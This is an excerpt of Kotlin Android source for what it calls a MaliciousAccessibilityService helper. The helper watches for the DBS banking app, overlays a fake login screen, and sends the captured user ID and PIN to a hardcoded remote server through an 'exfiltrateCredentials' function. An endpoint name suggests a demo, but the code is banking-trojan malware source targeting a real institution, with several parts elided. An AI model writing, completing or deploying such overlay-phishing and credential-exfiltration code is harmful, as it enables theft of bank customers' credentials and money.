...
/**
 * OverlayHelper — plain helper class (NOT an AccessibilityService).
 * Receives window-change events from MaliciousAccessibilityService.
 * When the DBS banking app is detected, shows a realistic phishing login overlay.
 */
class OverlayHelper(private val service: MaliciousAccessibilityService) {
    ...
    private val SERVER     = "http://20.189.79.25:5000"
    ...
    fun onEvent(event: AccessibilityEvent) {
        ...
        if (packageName == TARGET_APP && !isOverlayShowing) {
            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                ...
                isOverlayShowing = true  // set immediately to prevent race
    ...
    private fun exfiltrateCredentials(userId: String, pin: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                ...
                val connection = URL("$SERVER/api/phishing_demo")
